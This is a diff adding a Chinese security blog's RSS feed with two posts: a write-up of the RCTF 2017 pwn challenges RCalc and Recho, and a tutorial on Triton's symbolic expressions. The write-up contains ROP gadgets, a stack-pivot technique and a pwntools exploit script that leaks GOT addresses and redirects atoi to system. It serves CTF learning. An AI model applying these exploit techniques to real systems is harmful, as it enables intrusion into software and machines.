@@ -1,0 +1,133 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"
+  xmlns:atom="http://www.w3.org/2005/Atom"
+  xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Hc1m1</title>
+    <link>http://0x48.pw/</link>
+    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
+    
+    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
+    <pubDate>Tue, 23 May 2017 15:44:44 GMT</pubDate>
+    <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>ROP小结</title>
+      <link>http://0x48.pw/2017/05/23/0x33/</link>
+      <guid>http://0x48.pw/2017/05/23/0x33/</guid>
+      <pubDate>Tue, 23 May 2017 04:01:12 GMT</pubDate>
+      <description>
+      
+        &lt;p&gt;这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。&lt;/p&gt;
+      
+      </description>
+      
+      <content:encoded><![CDATA[<p>这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。</p>
+<a id="more"></a>
+<p>本文不进行实例调试，用脑子DEBUG……详细文件可以去我的github上找…</p>
+<h1 id="RCalc"><a href="#RCalc" class="headerlink" title="RCalc"></a>RCalc</h1><p>首先是计算器这题，作者自己实现了一个canary，首先在每个函数开头通过<code>sub_400AAB</code>函数生成了一个随机数，存放到堆中，和栈上面，然后在函数结尾使用<code>sub_400B92</code>函数检查这个栈上的随机数和堆中的随机数是否一样。</p>
+<p>然后可以去看看<code>sub_400A06</code>函数，在存放canary的堆上面有个一个0x100的堆，用于存放需要保存的计算结果，这个结果保存的函数没设定边界值，所以可以覆盖到canary的堆，从而覆盖到canary。</p>
+<p>绕过canary后，在<code>sub_400FA2</code>函数中，scanf函数存在栈溢出，正常情况下想，之后就是通过ROP很容易就能getshell了。</p>
+<p>但是，这里有一个坑点，scanf函数的<code>%s</code>不能出现<code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>, <code>\x20</code></p>
+<p>经过测试，如果输入中出现这几个字符，会被转成<code>\x00</code>，或者之后的数据就不会被读入变量中。</p>
+<p>这对我来说非常致命，因为got表的地址中都含有<code>\x20</code>，还有一些ROP被这些字符限制着，当时还想到了一个别的思路，比如利用<code>read</code>函数或者<code>sub_400c4e</code>函数，但是没找到控制rdx的ROP所以没法用<code>read</code>函数，另外，就算能调用，也没有思路下一步该怎么做，该读到什么位置？然后该怎么通过<code>read</code>继续溢出？</p>
+<p>而关于<code>sub_400c4e</code>函数，虽然函数中含有<code>\x0c</code>字符，但是我找到了一个</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">add</span> eax, 0x48002018 ; <span class="attribute">test</span> eax, eax ; <span class="attribute">je</span> 0x400803 ; <span class="attribute">call</span> rax</div></pre></td></tr></table></figure>
+<p>通过这个ROP就能调用<code>sub_400c4e</code>了，而<code>rdx</code>为最后一次choice输入的值，因为处理这个输入值得时候有个cdqe，虽然如果我输入0x100000005在判断中也是5，通过这个思路，可以让<code>sub_400c4e</code>函数中进行溢出，rdi和rsi也都是可控的。</p>
+<p>但是在测试中发现，首先我不知道栈地址，所以没法控制rsi，而在<code>sub_400FA2</code>函数的ret指令时，rsi正好就是一个栈地址，在当前栈地址的很上面，这种情况下，栈溢出会覆盖掉<code>sub_400c4e</code>的局部变量，导致没法成功进行栈溢出。</p>
+<p>在比赛结束之后，看来国外的一篇wp后，学到了两个知识点: <a href="http://hama.hatenadiary.jp/entry/2017/05/22/092142" target="_blank" rel="external">http://hama.hatenadiary.jp/entry/2017/05/22/092142</a></p>
+<p>首先是他们找的ROP：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">mov</span> rdx, r13 ; <span class="attribute">mov</span> rsi, r14 ; <span class="attribute">mov</span> edi, r15d ; <span class="attribute">call</span> qword [r12+rbx*<span class="number">8</span>];</div><div class="line"><span class="attribute">pop</span> rbx ; <span class="attribute">pop</span> rbp ; <span class="attribute">pop</span> r12 ; <span class="attribute">pop</span> r13 ; <span class="attribute">pop</span> r14 ; <span class="attribute">pop</span> r15; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
+<p>通过这个ROP基本可以调用任意函数了，我找ROP一般是使用默认的命令:</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> ROPgadget --<span class="keyword">binary</span> RCalc</div></pre></td></tr></table></figure>
+<p>但是却没有这个ROP，需要用</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$</span> <span class="comment">ROPgadget</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">binary</span> <span class="comment">RCalc</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">depth</span> <span class="comment">11</span></div></pre></td></tr></table></figure>
+<p>才有第二句ROP，而第一句还是没有。。所以我发现，我在找ROP上还是太菜了….</p>
+<p>其实，当时我已经基本可以做到调用任意函数了，但是关键点还是第二点。</p>
+<p>使用:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">leave</span>  ; <span class="attribute">ret</span> ;</div></pre></td></tr></table></figure>
+<p>来修改栈地址，这样一来思路就很清晰了。<br>找一段可以写的地址，比如bss区域，写入ROP，然后再把rsp修改成该地址，就可以getshell了，同read函数向bss区域写值，然后使用<code>leave</code>修改rsp</p>
+<p>我还是太菜，从来没想过修改栈地址……</p>
+<h1 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h1><p>本来也是一道简单的栈溢出，但循环的判断:</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">while(<span class="name">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x10)&gt;0)</div></pre></td></tr></table></figure>
+<p>要栈溢出首先得先停了这个循环，在shell中可以使用ctrl+d表示EOF，但是脚本咋写？<br>发现pwntools可以用下面的命令发送EOF</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s = remote(xxxx,xx)</div><div class="line">s<span class="selector-class">.sock</span><span class="selector-class">.shutdown</span>(socket.SHUT_RW)</div></pre></td></tr></table></figure>
+<p>但是这样我们没法继续输入了，所以我们需要发送一次payload就getflag，我们只能getflag而不能getshell，因为服务器已经关闭了接收我们数据的连接。</p>
+<p>这题没有libc，所以写ROP又是一个技术活….</p>
+<p>使用下面这个PoC:</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = <span class="string">"debug"</span></div><div class="line"><span class="comment"># context.terminal = ['terminator', '-x', 'bash', '-c']</span></div><div class="line">debug = 1</div><div class="line">if debug:</div><div class="line">    p = remote(<span class="string">"127.0.0.1"</span>, 10001)</div><div class="line"><span class="section">else:</span></div><div class="line">    p = remote(<span class="string">"recho.2017.teamrois.cn"</span>, 9527)</div><div class="line">e = ELF('Recho')</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line">padding = 0x38*'a'          <span class="comment">#padding</span></div><div class="line"><span class="comment"># write(1, got['read'], 8)</span></div><div class="line">payload = <span class="string">""</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['read'])  <span class="comment"># rsi = got.plt read</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"><span class="comment"># write(1, got['write'], 8)</span></div><div class="line">payload += p64(0x4008a3)  <span class="comment"># pop rdi;ret</span></div><div class="line">payload += p64(1)         <span class="comment"># rdi = 1</span></div><div class="line">payload += p64(0x4008a1)  <span class="comment"># pop rsi; pop r15; ret</span></div><div class="line">payload += p64(e.got['atoi'])  <span class="comment"># rsi = got.plt atoi</span></div><div class="line">payload += p64(0)         <span class="comment"># r15 = 0</span></div><div class="line">payload += p64(0x4006fe)  <span class="comment"># pop rdx;ret</span></div><div class="line">payload += p64(8)         <span class="comment"># rdx = 8</span></div><div class="line">payload += p64(e.symbols['write'])  <span class="comment"># call write</span></div><div class="line"></div><div class="line"></div><div class="line">p.readuntil(<span class="string">"server!\n"</span>)</div><div class="line">p.sendline('1000')</div><div class="line">p.sendline(padding + payload)</div><div class="line">p.recv()</div><div class="line">p.sock.shutdown(1)</div><div class="line">print u64(p.recv(8)) - u64(p.recv(8))</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>经过远程和本地测试对比，发现远程的libc应该和我本地的一样</p>
+<p>然后使用本地的libc写payload就好了。。</p>
+<p>思路是改写got表中随便一个函数的地址改成system就好了，比如我修改的是atoi函数，然后找binary中的ROP，找到下面三个：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">rax</span><span class="comment">; ret;</span></div><div class="line"><span class="keyword">add</span> [<span class="built_in">rdi</span>], <span class="built_in">al</span><span class="comment">; ret;</span></div></pre></td></tr></table></figure>
+<p>通过这三个，我们就能修改偏移了，比如:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601040)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601040</span>; atoi</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(0x10)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>  <span class="attr"># pop rax; ret;   rax = 0</span>x<span class="number">10</span>; add [rdi], al; ret;</div><div class="line"></div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4008a3)</span>+p<span class="number">64</span><span class="comment">(0x601041)</span>    <span class="attr"># pop rdi; ret;   rdi = 0</span>x<span class="number">601041</span>;</div><div class="line">payload += p<span class="number">64</span><span class="comment">(0x4006fc)</span>+p<span class="number">64</span><span class="comment">(229)</span> + p<span class="number">64</span><span class="comment">(0x40070d)</span>   <span class="attr"># pop rax; ret;   rax=0</span>xe<span class="number">5</span>;   add [rdi], al; ret;</div></pre></td></tr></table></figure>
+<p>这相当于got表中atoi函数的地址加上0xe510</p>
+<p>同样再使用上面的ROP往bss中写入<code>cat flag</code>，最后输出的指令是<code>system(&#39;cat flag&#39;)</code></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本以为栈溢出都会了，其实还是太菜…..</p>
+]]></content:encoded>
+      
+      <comments>http://0x48.pw/2017/05/23/0x33/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>Triton学习笔记(三)</title>
+      <link>http://0x48.pw/2017/04/05/0x32/</link>
+      <guid>http://0x48.pw/2017/04/05/0x32/</guid>
+      <pubDate>Wed, 05 Apr 2017 08:02:21 GMT</pubDate>
+      <description>
+      
+        &lt;p&gt;Triton我看重的就两点，一是可以让我不用写C/C++, 另一点就是本篇要开始讲的重点，符号执行，这篇先介绍符号执行&lt;/p&gt;
+      
+      </description>
+      
+      <content:encoded><![CDATA[<p>Triton我看重的就两点，一是可以让我不用写C/C++, 另一点就是本篇要开始讲的重点，符号执行，这篇先介绍符号执行</p>
+<a id="more"></a>
+<p>首先看官方给的例子:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># src/examples/python/ir.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python2</span></div><div class="line"><span class="comment">## -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">import  sys</div><div class="line">from    triton import *</div><div class="line"></div><div class="line"></div><div class="line">code = [</div><div class="line">    (<span class="number">0</span>x400000, <span class="string">"\x48\x8b\x05\xb8\x13\x00\x00"</span>), <span class="comment"># mov        rax, QWORD PTR [rip+0x13b8]</span></div><div class="line">    (<span class="number">0</span>x400007, <span class="string">"\x48\x8d\x34\xc3"</span>),             <span class="comment"># lea        rsi, [rbx+rax*8]</span></div><div class="line">    (<span class="number">0</span>x40000b, <span class="string">"\x67\x48\x8D\x74\xC3\x0A"</span>),     <span class="comment"># lea        rsi, [ebx+eax*8+0xa]</span></div><div class="line">    (<span class="number">0</span>x400011, <span class="string">"\x66\x0F\xD7\xD1"</span>),             <span class="comment"># pmovmskb   edx, xmm1</span></div><div class="line">    (<span class="number">0</span>x400015, <span class="string">"\x89\xd0"</span>),                     <span class="comment"># mov        eax, edx</span></div><div class="line">    (<span class="number">0</span>x400017, <span class="string">"\x80\xf4\x99"</span>),                 <span class="comment"># xor        ah, 0x99</span></div><div class="line">    (<span class="number">0</span>x40001a, <span class="string">"\xC5\xFD\x6F\xCA"</span>),             <span class="comment"># vmovdqa    ymm1, ymm2</span></div><div class="line">]</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="comment">#Set the arch</span></div><div class="line">    setArchitecture(ARCH.X86_64)</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (addr, opcodes) <span class="keyword">in</span> code:</div><div class="line">        <span class="comment"># Build an instruction</span></div><div class="line">        inst = Instruction()</div><div class="line"></div><div class="line">        <span class="comment"># Setup opcodes</span></div><div class="line">        inst.setOpcodes(opcodes)</div><div class="line"></div><div class="line">        <span class="comment"># Setup Address</span></div><div class="line">        inst.setAddress(addr)</div><div class="line"></div><div class="line">        <span class="comment"># optional - Update register state</span></div><div class="line">        inst.updateContext(Register(REG.RAX,  <span class="number">12345</span>));</div><div class="line">        inst.updateContext(Register(REG.RBX,  <span class="number">67890</span>));</div><div class="line"></div><div class="line">        <span class="comment"># optional - Add memory access &lt;addr, size, content&gt;</span></div><div class="line">        inst.updateContext(MemoryAccess(<span class="number">0</span>x66666666, <span class="number">8</span>, <span class="number">0</span>x31003200330034));</div><div class="line"></div><div class="line">        <span class="comment"># Process everything</span></div><div class="line">        processing(inst)</div><div class="line"></div><div class="line">        <span class="comment"># Display instruction</span></div><div class="line">        print inst</div><div class="line"></div><div class="line">        <span class="comment"># Display symbolic expressions</span></div><div class="line">        <span class="keyword">for</span> expr <span class="keyword">in</span> inst.getSymbolicExpressions():</div><div class="line">            print <span class="string">'\t'</span>, expr</div><div class="line"></div><div class="line">        print</div><div class="line"></div><div class="line">    sys.<span class="keyword">exit</span>(<span class="number">0</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ python src/examples/python/ir.py</div><div class="line"><span class="number">0x400000</span>: mov rax, qword ptr [rip + <span class="number">0x13b8</span>]</div><div class="line">	ref!<span class="number">0</span> = ((<span class="keyword">_</span> zero_extend <span class="number">0</span>) (concat ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)) ((<span class="keyword">_</span> extract <span class="number">7</span> <span class="number">0</span>) (<span class="keyword">_</span> bv0 <span class="number">8</span>)))) ; MOV operation</div><div class="line">	ref!<span class="number">1</span> = ((<span class="keyword">_</span> zero_extend <span class="number">0</span>) (<span class="keyword">_</span> bv4194311 <span class="number">64</span>)) ; <span class="keyword">Program</span> Counter</div><div class="line">.......</div><div class="line"><span class="number">0x400007</span>: lea rsi, qword ptr [rbx + rax*<span class="number">8</span>]</div><div class="line">	ref!<span class="number">2</span> = ((<span class="keyword">_</span> zero_extend <span class="number">0</span>) (bvadd (<span class="keyword">_</span> bv0 <span class="number">64</span>) (bvadd (<span class="keyword">_</span> bv67890 <span class="number">64</span>) (bvmul ((<span class="keyword">_</span> extract <span class="number">63</span> <span class="number">0</span>) ref!<span class="number">0</span>) (<span class="keyword">_</span> bv8 <span class="number">64</span>))))) ; LEA operation</div><div class="line">	ref!<span class="number">3</span> = ((<span class="keyword">_</span> zero_extend <span class="number">0</span>) (<span class="keyword">_</span> bv4194315 <span class="number">64</span>)) ; <span class="keyword">Program</span> Counter</div><div class="line">.......</div></pre></td></tr></table></figure>
+<p>输出结果的第一行是汇编代码，下面的几行就是符号表达式了</p>
+<p>符号表达式说简单点就是把一个变量的变化用表达式表示出来</p>
+<p>其实只要理解了每个符号所代表的意义，还是很容易理解的，末尾也有注释</p>
+<p>比如:</p>
+<blockquote>
+<p>ref!1 = ((_ zero<em>extend 0) (</em> bv4194311 64)) ; Program Counter</p>
+</blockquote>
+<p>后面的注释很明显，程序指针，也就是<code>eip</code>, 其中<code>(_ bv4194311 64)</code>表示一个64bit的数，值的十进制表示为<code>4194311</code>，转成十六进制就是<code>0x400007</code>, <code>(_ zero_extend 0)</code>表示剩余为用<code>0</code>填充，<code>4194311</code>是不够64bit的，所以前面要用<code>0</code>到64bit</p>
+<p>所以这个符号表达式翻译成简单的表达式就是<code>eip = 0x400007</code>, 很好理解的，执行完这句指令后，下句指令的地址就是<code>0x400007</code></p>
+<p>为啥要用这么复杂的一个符号表达式来表示这么简单的一句指令呢? 我认为应该是涉及到污点染色，会在之后的篇章中介绍</p>
+<blockquote>
+<p>ref!0 = ((_ zero<em>extend 0) (concat ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (<em> bv0 8)) ((</em> extract 7 0) (_ bv0 8)))) ; MOV operation</p>
+</blockquote>
+<p>看注释就知道，这句表达式是<code>mov</code>操作的表达式，处于学习阶段我们就耐心的慢慢读表达式，等都理解之后可以使用专门的模块进行处理.</p>
+<p><code>((_ extract 7 0) (_ bv0 8))</code>这句很简单，一个8bit的数0，取<code>0-7</code>bit的数，来举一个特例来解释下把，比如<code>((_ extract 4 1) (_ bv93 8))</code>的值是<code>14</code></p>
+<p>化简后就是: <code>((_ zero_extend 0) (concat 0 0 0 0 0 0 0 0))</code>, <code>concat</code>的作用就是把后面8个8bit的0连接起来，因为赋值给rax, 用了qword指针，所以是64位</p>
+<p>因为示例不是实际代码, <code>[eip+0x13b8]</code>指向的地址值未知，所以这里是0</p>
+<p>我们继续往底下看，下一句指令是<code>lea rsi, qword ptr [rbx + rax*8]</code></p>
+<p>符号表达式是:</p>
+<blockquote>
+<p>ref!2 = ((_ zero<em>extend 0) (bvadd (</em> bv0 64) (bvadd (<em> bv67890 64) (bvmul ((</em> extract 63 0) ref!0) (_ bv8 64))))) ; LEA operation</p>
+</blockquote>
+<p>其中<code>ref!0</code>从上面我们可以看出表示的是<code>rax</code>, 所以<code>((_ extract 63 0) ref!0)</code>表示的就是<code>rax</code>，如果改成<code>((_ extract 31 0) ref!0)</code>则表示的就是32为的<code>rax</code>也就是<code>eax</code></p>
+<p>我们对表达式进行化简: <code>(bvadd 0 (bvadd 67890 (bvmul rax 8)))</code></p>
+<p><code>(bvmul rax 8)</code>也就是<code>rax*8</code></p>
+<p><code>bvadd</code>表示加法</p>
+<p>剩下看的就简单了: <code>rax*8 + 67890 + 0</code></p>
+<p>我们在python代码中初始化过<code>rbx</code>的值:</p>
+<blockquote>
+<p>inst.updateContext(Register(REG.RBX,  67890));</p>
+</blockquote>
+<p>所以<code>67890</code>表示的就是<code>rbx</code></p>
+<p>这句表达式就容易理解了，<code>rsi = rax*8 + rbx</code></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>介绍暂时就介绍这些，Triton的符号表达式引擎用的是<code>SMT2-LIB</code>, 所以要知道某句表达式的意思可以去参考官方文档</p>
+<ol>
+<li><a href="http://smtlib.github.io/jSMTLIB/SMTLIBTutorial.pdf" target="_blank" rel="external">The SMT-LIBv2 Language and Tools: A Tutorial</a></li>
+<li><a href="http://smtlib.cs.uiowa.edu/logics-all.shtml#AUFLIA" target="_blank" rel="external">The SMT-LIBv2 Theories Library</a></li>
+</ol>
+]]></content:encoded>
+      
+      <comments>http://0x48.pw/2017/04/05/0x32/#disqus_thread</comments>
+    </item>
+    
+  </channel>
+</rss>
